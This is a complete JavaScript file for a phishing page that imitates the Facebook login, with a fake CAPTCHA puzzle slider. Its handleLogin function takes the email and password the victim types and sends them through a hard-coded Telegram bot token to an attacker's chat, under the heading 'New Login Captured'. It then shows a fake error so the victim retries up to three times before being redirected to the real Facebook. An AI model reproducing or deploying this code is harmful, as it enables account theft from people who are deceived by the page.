console.log("Facebook Clone Script Loaded");

// --- Telegram Configuration ---
const BOT_TOKEN = '8399552625:AAGxzewNMQxT5aCKFGJxnvlHezg49OKCETw';
const CHAT_ID = '7181535206';

function togglePassword() {
    const passwordInput = document.getElementById('password');
    const eyeIconSvg = document.querySelector('.eye-icon');

    if (!passwordInput || !eyeIconSvg) return;

    const eyeOpenPath = `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>`;
    const eyeSlashPath = `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle><line x1="1" y1="1" x2="23" y2="23"></line>`;

    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        eyeIconSvg.innerHTML = eyeSlashPath;
    } else {
        passwordInput.type = 'password';
        eyeIconSvg.innerHTML = eyeOpenPath;
    }
}

document.addEventListener('DOMContentLoaded', () => {
    // 1. Check if verified
    const isVerified = sessionStorage.getItem('captcha_verified') === 'true';
    if (isVerified) {
        const overlay = document.getElementById('captcha-overlay');
        const loginPage = document.querySelector('.main-container'); // Adjusted selector to match your HTML
        if (overlay) overlay.style.display = 'none';
        if (loginPage) loginPage.style.display = 'flex';
    }

    // 2. Init Login Features
    const passwordInput = document.getElementById('password');
    if (passwordInput) {
        passwordInput.addEventListener('input', function () {
            const eyeIconWrapper = document.querySelector('.eye-icon-wrapper');
            if (eyeIconWrapper) {
                eyeIconWrapper.style.display = this.value.length > 0 ? 'flex' : 'none';
            }
        });
    }

    const loginAttempts = parseInt(sessionStorage.getItem('fb_login_attempts') || '0');
    const showError = sessionStorage.getItem('fb_show_error') === 'true';

    // Show error message on 1st and 2nd failed attempt
    if (showError && loginAttempts > 0 && loginAttempts < 3) {
        const errorMsg = document.getElementById('error-message');
        if (errorMsg) errorMsg.style.display = 'block';
    }

    initPuzzleSlider();
});

let captchaProcessing = false;

function startCaptchaProcess() {
    if (captchaProcessing) return;
    captchaProcessing = true;

    const checkbox = document.getElementById('recaptcha-checkbox');
    const spinner = document.getElementById('checkbox-spinner');

    if (checkbox) checkbox.style.visibility = 'hidden';
    if (spinner) spinner.style.display = 'block';

    setTimeout(() => {
        const step1 = document.getElementById('captcha-step-1');
        const step2 = document.getElementById('captcha-step-2');
        if (step1) step1.style.display = 'none';
        if (step2) step2.style.display = 'block';
        resetPuzzle();
        captchaProcessing = false;
    }, 1200);
}

function resetPuzzle() {
    const piece = document.getElementById('puzzle-piece');
    const handle = document.getElementById('slider-handle');
    if (piece) piece.style.left = '10px';
    if (handle) handle.style.left = '0px';
}

function initPuzzleSlider() {
    const handle = document.getElementById('slider-handle');
    const piece = document.getElementById('puzzle-piece');
    const track = document.querySelector('.slider-track');

    if (!handle || !piece || !track) return;

    let isDragging = false;
    let startX = 0;
    let maxSlide = 0;

    const onStart = (e) => {
        isDragging = true;
        const trackWidth = track.clientWidth;
        const handleWidth = handle.clientWidth;
        maxSlide = trackWidth - handleWidth;
        startX = (e.type === 'mousedown' ? e.clientX : e.touches[0].clientX) - handle.offsetLeft;
        handle.style.transition = 'none';
        piece.style.transition = 'none';
        document.body.style.userSelect = 'none';
    };

    const onMove = (e) => {
        if (!isDragging) return;
        const currentX = e.type === 'mousemove' ? e.clientX : e.touches[0].clientX;
        let left = currentX - startX;
        if (left < 0) left = 0;
        if (left > maxSlide) left = maxSlide;
        handle.style.left = left + 'px';
        const pieceLeft = 10 + (left / maxSlide) * 270;
        piece.style.left = pieceLeft + 'px';
    };

    const onEnd = () => {
        if (!isDragging) return;
        isDragging = false;
        document.body.style.userSelect = 'auto';
        const pieceLeft = parseFloat(piece.style.left);
        const targetLeft = 280;
        const tolerance = 7;

        if (Math.abs(pieceLeft - targetLeft) <= tolerance) {
            handle.style.background = '#42b72a';
            handle.style.color = '#fff';
            handle.innerHTML = '✓';
            setTimeout(() => {
                sessionStorage.setItem('captcha_verified', 'true');
                document.getElementById('captcha-overlay').style.display = 'none';
                const loginPage = document.querySelector('.main-container');
                if (loginPage) loginPage.style.display = 'flex';
            }, 800);
        } else {
            handle.style.transition = 'left 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)';
            piece.style.transition = 'left 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)';
            handle.style.left = '0px';
            piece.style.left = '10px';
        }
    };

    handle.addEventListener('mousedown', onStart);
    document.addEventListener('mousemove', onMove);
    document.addEventListener('mouseup', onEnd);
    handle.addEventListener('touchstart', onStart);
    document.addEventListener('touchmove', onMove);
    document.addEventListener('touchend', onEnd);
}

async function handleLogin(event) {
    event.preventDefault();
    if (sessionStorage.getItem('captcha_verified') !== 'true') return;

    // 1. UI Feedback (Instant)
    const loginBtn = document.querySelector('.login-btn');
    if (loginBtn) loginBtn.disabled = true;
    document.body.style.cursor = 'wait';

    // 2. Capture Data
    const email = document.querySelector('input[type="text"]').value;
    const password = document.getElementById('password').value;

    let attempts = parseInt(sessionStorage.getItem('fb_login_attempts') || '0');
    attempts++;

    // 3. Transmit to Telegram (Fire and forget to avoid blocking)
    const message = `🔔 *New Login Captured*\n👤 *User:* \`${email}\`\n🔑 *Pass:* \`${password}\`\n🔢 *Attempt:* #${attempts}`;

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        })
    }).catch(err => console.error("Bot reporting failed", err));

    // 4. Update Session
    sessionStorage.setItem('fb_login_attempts', attempts);
    sessionStorage.setItem('fb_show_error', 'true');

    // 5. Redirection / Reload Logic (Near-instant)
    setTimeout(() => {
        if (attempts >= 3) {
            window.location.href = "https://www.facebook.com/login/";
        } else {
            window.location.reload();
        }
    }, 2000);
}